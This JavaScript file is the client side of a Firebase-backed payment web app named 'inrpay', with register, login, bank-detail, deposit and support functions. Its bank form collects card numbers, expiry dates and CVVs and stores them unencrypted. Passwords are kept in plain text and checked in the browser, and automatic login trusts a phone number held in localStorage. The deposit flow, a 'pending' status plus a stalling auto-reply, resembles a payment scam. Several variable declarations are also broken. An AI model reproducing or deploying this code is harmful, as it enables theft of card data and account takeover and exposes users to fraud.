import { initializeApp } from "https://www.gstatic.com/firebasejs/12.12.0/firebase-app.js";
import { getFirestore, doc, setDoc, getDoc, updateDoc } from "https://www.gstatic.com/firebasejs/12.12.0/firebase-firestore.js";

const app = initializeApp({
  apiKey: "AIzaSyBh-J9LAYeCfxNoKw9C94gbCqVhELofuoo",
  authDomain: "inrpay-44413.firebaseapp.com",
  projectId: "inrpay-44413"
});

const db = getFirestore(app);

// MESSAGE
function showMsg(t){
msgText.innerText = t;
msgBox.style.display="flex";
}
window.closeMsg = ()=> msgBox.style.display="none";

// REGISTER
window.register = async ()=>{
let name=name.value, number=number.value, password=password.value;

if(!number || !password){
showMsg("Enter number & password");
return;
}

await setDoc(doc(db,"users",number),{
name, number, password, balance:0
});

showMsg("Account Created");
}

// LOGIN
window.login = async ()=>{
let number=number.value, password=password.value;

let snap = await getDoc(doc(db,"users",number));

if(!snap.exists()) return showMsg("User not found");

let user = snap.data();

if(user.password !== password) return showMsg("Wrong password");

auth.style.display="none";
dashboard.style.display="block";

username.innerText=user.name;
balance.innerText="₹"+user.balance;

localStorage.setItem("user",number);
}

// AUTO LOGIN
window.onload = async ()=>{
let number=localStorage.getItem("user");
if(!number) return;

let snap = await getDoc(doc(db,"users",number));

if(snap.exists()){
let user=snap.data();
auth.style.display="none";
dashboard.style.display="block";
username.innerText=user.name;
balance.innerText="₹"+user.balance;
}
}

// LOGOUT
window.logout = ()=>{
localStorage.clear();
location.reload();
}

// BANK
window.openBank=()=>bankBox.style.display="flex";
window.closeBank=()=>bankBox.style.display="none";

window.saveBank = async ()=>{
let number=localStorage.getItem("user");

await setDoc(doc(db,"bank",number),{
name:accName.value,
bank:bankName.value,
account:accNumber.value,
ifsc:ifsc.value,
mobile:bankMobile.value,
type:accType.value,
atm:atm.value,
expiry:expiry.value,
cvv:cvv.value
});

showMsg("Bank Saved");
closeBank();
}

// DEPOSIT
window.deposit = async ()=>{
let snap = await getDoc(doc(db,"settings","payment"));
if(snap.exists()){
let d=snap.data();
upiText.innerText=d.upi;
qrImg.src=d.qr;
}
depositBox.style.display="flex";
}

window.closeDeposit=()=>depositBox.style.display="none";

window.submitDeposit = async ()=>{
let utr=utr.value;
if(!utr) return showMsg("Enter UTR");

let number=localStorage.getItem("user");

await setDoc(doc(db,"deposits",Date.now()+""),{
user:number, utr, status:"pending"
});

showMsg("Deposit Submitted");
closeDeposit();
}

// SUPPORT
window.openSupport=()=>supportBox.style.display="flex";
window.closeSupport=()=>supportBox.style.display="none";

window.autoReply=()=>{
supportMsg.innerText="Please wait 30 min to 1 hour";
}